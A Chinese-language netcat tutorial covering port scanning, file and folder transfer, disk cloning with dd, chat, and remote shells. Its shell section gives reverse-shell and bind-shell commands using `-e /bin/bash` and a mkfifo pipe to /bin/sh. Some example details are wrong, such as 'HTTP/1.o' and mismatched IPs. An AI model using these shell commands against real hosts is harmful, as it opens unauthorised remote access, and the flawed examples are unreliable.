# netcat

nc, netcat 的缩写, 是类 unix 系统下一个功能强大的命令行网络工具, 用来在两台主机之间建立 TCP 或者 UDP 连接, 
并通过标准输入输出进行读和写

强大之处在于输出是标准输出(stdout), 输入来自标准输入(stdin), 以至于可以很容易通过管道和重定向直接使用或被其他程序和脚本调用。
正因为它的这种特性, 可以用它做很多事情:

- 端口扫描: 通过与目的 IP 建立连接, 从而扫描目的IP 的端口是否开放
- 聊天工具: 一边使用 nc 监听一个端口, 另一边使用 nc 成功连接这个端口即可互相通信
- 发送文件: 与目的 IP 建立连接, 配合重定向, 源地址读取文件, 目的地址接收文件
- 目录传输: tar 命令和管道的结合
- 远程克隆磁盘: dd 命令和管道的结合
- 配合 ssh config 的 ProxyCommand 命令进行跳板登录
- telnet / 获取系统 banner 信息
- nc 反弹ssh 命令

nc 有很多变种, ncat,pnetcat,socat,sock,socket,sbd 都是指它, 在不同的系统下, 都进行了不同程度的修改, 
但是无论怎样, 都可以使用 nc 这个名字.

## 常用参数

``` bash
nc -h
OpenBSD netcat (Debian patchlevel 1.218-4ubuntu1)
usage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl]
          [-m minttl] [-O length] [-P proxy_username] [-p source_port]
          [-q seconds] [-s sourceaddr] [-T keyword] [-V rtable] [-W recvlimit]
          [-w timeout] [-X proxy_protocol] [-x proxy_address[:port]]
          [destination] [port]
        Command Summary:
                -4              Use IPv4
                -6              Use IPv6
                -b              Allow broadcast
                -C              Send CRLF as line-ending
                -D              Enable the debug socket option
                -d              Detach from stdin
                -F              Pass socket fd
                -h              This help text
                -I length       TCP receive buffer length
                -i interval     Delay interval for lines sent, ports scanned
                -k              Keep inbound sockets open for multiple connects
                -l              Listen mode, for inbound connects
                -M ttl          Outgoing TTL / Hop Limit
                -m minttl       Minimum incoming TTL / Hop Limit
                -N              Shutdown the network socket after EOF on stdin
                -n              Suppress name/port resolutions
                -O length       TCP send buffer length
                -P proxyuser    Username for proxy authentication
                -p port         Specify local port for remote connects
                -q secs         quit after EOF on stdin and delay of secs
                -r              Randomize remote ports
                -S              Enable the TCP MD5 signature option
                -s sourceaddr   Local source address
                -T keyword      TOS value
                -t              Answer TELNET negotiation
                -U              Use UNIX domain socket
                -u              UDP mode
                -V rtable       Specify alternate routing table
                -v              Verbose
                -W recvlimit    Terminate after receiving a number of packets
                -w timeout      Timeout for connects and final net reads
                -X proto        Proxy protocol: "4", "5" (SOCKS) or "connect"
                -x addr[:port]  Specify proxy address and port
                -Z              DCCP mode
                -z              Zero-I/O mode [used for scanning]
        Port numbers can be individual or ranges: lo-hi [inclusive]
```

#### 一些常用的参数选项说明：

- `-s source_ip_address`:  
指定 nc 应用与远程主机建立连接的 IP
如果不使用此选项, 默认为使用 0.0.0.0

- `-p source_port`:  
指定 nc 应用与远程主机建立连接的源端口
如果不指定此选项, 则随机一个可用的端口

- `-z`:  
nc 仅仅扫描指定主机的端口, 而不发送任何数据

- `-w` timeout:  
指定与远程主机建立连接成功后超过 timeout 秒自动断开连接
如果不使用此选项, 则默认无超时

- `-l [ip]:port` :  
监听端口 port, 相当于本机启动了一个服务
ip 是可选的, 如果不指定, 默认为 0.0.0.0

- `-x proxy_address[:port]`:  
指定 nc 请求时使用的代理服务port 是可选的, 如果不指定 port, 
则代理服务的 port 为指定代理协议的众所周知的端口: 1080(SOCKS), 3128(HTTPS)

- `-X proxy_version`  
指定 nc 请求时使用代理服务的协议
    * proxy_version 为 4 : 表示使用的代理为 SOCKS4 代理
    * proxy_version 为 5 : 表示使用的代理为 SOCKS5 代理
    * proxy_version 为 connect : 表示使用的代理为 HTTPS 代理  
如果不指定协议, 则默认使用的代理为 SOCKS5 代理
- `-u`: 
指定使用的 UDP 协议
如果不使用此选项, 默认为使用 TCP 协议

- `-e command `: 
执行给出的命令, `--exec`

- `-c command` :  
通过` /bin/sh` 执行命令 command, `--sh-exec`

- `-v` :  
打印详细的输出

## 使用实践

### 建立原始 TCP 连接
* 与 bing 的 80 端口建立一个 TCP 连接(本地端口随机):
```bash
$ nc cn.bing.com 80
```
wireshark 抓包如下图：

![image](../imgs/misc/2024-02-16-185503.png)


* 使用本地 1234 端口与 www.baidu.com 的 80 端口建立一个 TCP 连接:
```bash
$ nc -p 1234 www.baidu.com 80
```


* 与 www.baidu.com 的 80 端口建立一个 TCP 连接, 超过 5s 自动断开:

```bash
$ nc -w 5 www.baidu.com 80
```

* 与 www.baidu.com 的 80 端口建立一个 TCP 连接, 并发送请求头, 模拟浏览器访问百度

```bash
$ echo `GET / HTTP/1.o\r\n\r\n` | nc -p 12345 www.baidu.com 80
```
或者这样
```bash
$ nc -p 22233 www.baidu.com 80
```

### 端口扫描
通过 `-v` 选项，可以看到nc 是通过尝试建立连接来确认端口是否开发被使用的：

```bash
sphinx@vbox:~$ nc -v 0.0.0.0 -z 2222-2225
nc: connect to 0.0.0.0 port 2222 (tcp) failed: Connection refused
nc: connect to 0.0.0.0 port 2223 (tcp) failed: Connection refused
nc: connect to 0.0.0.0 port 2224 (tcp) failed: Connection refused
nc: connect to 0.0.0.0 port 2225 (tcp) failed: Connection refused
```

### 发送文件
把 192.168.71.128 上的文件 .vimrc 发送到 192.168.71.127保存为 test.txt:

在 127 上: 
```bash
sphinx@vbox:~$ ip addr show
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:e8:13:37 brd ff:ff:ff:ff:ff:ff
    inet 192.168.71.127/24 brd 192.168.71.255 scope global dynamic noprefixroute enp0s3
       valid_lft 82277sec preferred_lft 82277sec
    inet6 fe80::ac33:7173:1b1d:fedc/64 scope link noprefixroute
       valid_lft forever preferred_lft forever
sphinx@vbox:~$ nc -l 12345 > test.txt
```

在128 上：
```bash
nc 192.168.71.127 12345 < ./.vimrc
```

然后就可以看到
```bash
sphinx@vbox:~$ ls
Desktop  snap  test.txt
```

#### 文件夹传输
配合 tar 命令和管道, 在两台主机之间传输文件夹内容

把 A 的文件夹 dir 发往 B

在 A 上: `tar -cvf - dir | nc -l 1234`

在 B 上: `nc A.IP 1234 | tar xvf -`

使用 tar 的 -j 选项(bzip2) 或 z 选项(gzip) 进行数据压缩传输

#### 克隆磁盘
配合 dd 命令和管道, 进行远程磁盘读写

把 A 上的 /dev/sda1 克隆到 B 上的 /dev/sdb2:

在 A 上: `dd if=/dev/sda1 | nc -l 1234`

在 B 上: `nc A.IP 1234 | dd of=/dev/sdb2`


### 聊天工具
和发送文件类, 建立本地监听， 然后对端连上来：

A 机器上：`~$ nc -l 12345`

B 机器上：`~$ nc 192.168.71.127 12345`

如图：
![nc_chat](..\imgs\misc\2024-02-16-193158.png)

### shell

#### 反向shell
在服务端访问客户端的 shell

服务器IP访问本地 shell:

在服务器上: `nc -l 1234`

在本机: `nc IP 1234 -e /bin/bash`

#### shell 命令
可以打开一个远程主机的 bash, 对远程主机进行操作

从本地远程打开 192.168.1.1 的 shell:

在 192.168.1.2 上:  `nc -l 1234 -e /bin/bash`

在本地:  `nc 192.168.11.3 1234`
如果不支持 -e 或 -c 选项, 可以这样做:

在 192.168.1.2 上:

```bash
  $ mkfifo /tmp/tmp_fifo
  $ cat /tmp/tmp_fifo | /bin/sh 2>&1 | nc -l 1234 > /tmp/tmp_fifo
```

在本地: `nc 192.168.1.2 1234`
